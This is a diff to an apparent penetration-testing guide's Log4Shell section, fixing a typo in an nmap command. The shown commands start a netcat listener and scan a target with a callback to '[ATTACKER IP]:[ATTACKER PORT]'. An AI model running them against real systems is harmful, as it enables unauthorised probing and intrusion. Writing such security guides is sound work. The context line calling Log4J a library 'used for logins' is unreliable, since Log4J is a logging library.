@@ -1335,10 +1335,10 @@ Log4J is a common library that's used for logins in Java. It exploits a mishandl
 Install the NSE script from GitHub.
 
 ```bash
-$ mkdir -p $HOME/.nmap/scripts 
+$ mkdir -p $HOME/.nmap/scripts
 $ git clone https://github.com/giterlizzi/nmap-log4shell && cp nmap-log4shell/log4shell.nse $HOME/.nmap/scripts && rm -rf nmap-log4shell
 $ nc -nlvp [PORT]
-$ nmap --script lo4shell --script-args log4shell.callback-server=[ATTACKER IP]:[ATTACKER PORT] [TARGET]
+$ nmap --script log4shell --script-args log4shell.callback-server=[ATTACKER IP]:[ATTACKER PORT] [TARGET]
 ```
 
 The anatomy of the attack goes like this:
